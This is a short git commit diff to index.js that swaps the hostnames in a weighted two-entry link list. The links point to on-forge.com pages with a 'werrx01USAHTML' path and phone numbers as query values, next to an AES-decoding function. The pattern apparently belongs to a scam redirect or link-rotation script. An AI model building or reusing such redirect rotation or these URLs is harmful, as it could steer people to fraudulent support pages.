25a5c4e99f8a83c7c6b1e29394323260ee0e428c
animalinside <akshay.anand12@yahoo.com>
2026-05-27 11:33:37 +0530

    Update index.js

--- index.js
+++ index.js
@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://Urban-Thread.on-forge.com/werrx01USAHTML/?bcda=+65 653-106-3088", weight: 0.5 },
-        { url: "https://Urban-Thread.on-forge.com/werrx01USAHTML/?bcda=+65 800 852 3109", weight: 0.5 }
+        { url: "https://LuxeCraft.on-forge.com/werrx01USAHTML/?bcda=+65 653-106-3088", weight: 0.5 },
+        { url: "https://LuxeCraft.on-forge.com/werrx01USAHTML/?bcda=+65 800 852 3109", weight: 0.5 }
       
     ];
 
